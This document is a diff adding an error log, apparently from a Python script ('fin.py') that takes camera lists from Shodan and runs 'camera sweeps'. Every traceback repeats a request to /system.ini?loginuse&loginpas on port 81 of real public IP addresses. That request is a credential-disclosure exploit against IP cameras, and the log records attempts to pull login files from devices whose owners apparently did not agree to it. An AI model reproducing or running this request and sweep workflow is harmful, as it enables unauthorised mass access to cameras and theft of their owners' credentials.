+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='47.91.115.45', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EC2E4460>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 516, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='47.91.115.45', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000087EC2E4460>: Failed to establish a new connection: [WinError 10061] Подключение не установлено, т.к. конечный компьютер отверг запрос на подключение'))
+
+INFO:root:[2023-04-25 21:25:13.284544]: Shutdown
+
+INFO:root:2023-04-25 21:33:38.164547: Program started.
+
+INFO:root:[2023-04-25 21:33:38.502509]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:33:38.631474]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:33:40.769397]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:33:40.769397]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:33:46.647871]: KeyboardInterrupt.
+
+INFO:root:2023-04-25 21:33:52.918490: Program started.
+
+INFO:root:[2023-04-25 21:33:53.112747]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:33:53.239332]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:33:53.596166]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:33:53.596166]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:34:08.533863]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000ED9A407340>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='123.60.99.208', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000ED9A407340>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='123.60.99.208', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000ED9A407340>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)'))
+
+INFO:root:[2023-04-25 21:34:48.310637]: Shutdown
+
+INFO:root:2023-04-25 21:35:12.289960: Program started.
+
+INFO:root:[2023-04-25 21:35:14.448430]: Modules imported successfully.
+
+INFO:root:[2023-04-25 21:35:14.576277]: Search operation started without arguments.
+
+INFO:root:[2023-04-25 21:35:17.345036]: Received camera data from Shodan.
+
+INFO:root:[2023-04-25 21:35:17.346015]: Camera sweeps have begun.
+
+ERROR:root:[2023-04-25 21:35:32.684379]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='124.70.104.131', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='124.70.104.131', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:35:52.514868]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000D8C2A4D400>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='123.60.99.208', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2A4D400>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='123.60.99.208', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2A4D400>, 'Connection to 123.60.99.208 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:36:07.349547]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='47.108.60.108', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='47.108.60.108', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:36:19.150178]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 426, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 421, in _make_request
+    httplib_response = conn.getresponse()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1347, in getresponse
+    response.begin()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 307, in begin
+    version, status, reason = self._read_status()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 268, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 410, in increment
+    raise six.reraise(type(error), error, _stacktrace)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\packages\six.py", line 735, in reraise
+    raise value
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 428, in _make_request
+    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 335, in _raise_timeout
+    raise ReadTimeoutError(
+urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='122.9.136.45', port=81): Read timed out. (read timeout=10)
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 529, in send
+    raise ReadTimeout(e, request=request)
+requests.exceptions.ReadTimeout: HTTPConnectionPool(host='122.9.136.45', port=81): Read timed out. (read timeout=10)
+
+ERROR:root:[2023-04-25 21:36:36.598421]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000D8C2CF21F0>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF21F0>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 646, in send
+    r = adapter.send(request, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 504, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='98.57.10.101', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF21F0>, 'Connection to 98.57.10.101 timed out. (connect timeout=10)'))
+
+ERROR:root:[2023-04-25 21:36:47.134632]
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 159, in _new_conn
+    conn = connection.create_connection(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 84, in create_connection
+    raise err
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\connection.py", line 74, in create_connection
+    sock.connect(sa)
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 670, in urlopen
+    httplib_response = self._make_request(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 392, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\http\client.py", line 950, in send
+    self.connect()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 187, in connect
+    conn = self._new_conn()
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connection.py", line 164, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2D60>, 'Connection to 8.142.13.77 timed out. (connect timeout=10)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\adapters.py", line 439, in send
+    resp = conn.urlopen(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\connectionpool.py", line 726, in urlopen
+    retries = retries.increment(
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\urllib3\util\retry.py", line 446, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='8.142.13.77', port=81): Max retries exceeded with url: /system.ini?loginuse&loginpas (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000D8C2CF2D60>, 'Connection to 8.142.13.77 timed out. (connect timeout=10)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "C:\Users\maxtyson\Desktop\fin.py", line 403, in st
+    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\api.py", line 60, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "C:\Users\maxtyson\AppData\Local\Programs\Python\Python38\lib\site-packages\requests\sessions.py", line 533, in request
+    resp = self.send(prep, **send_kwargs)
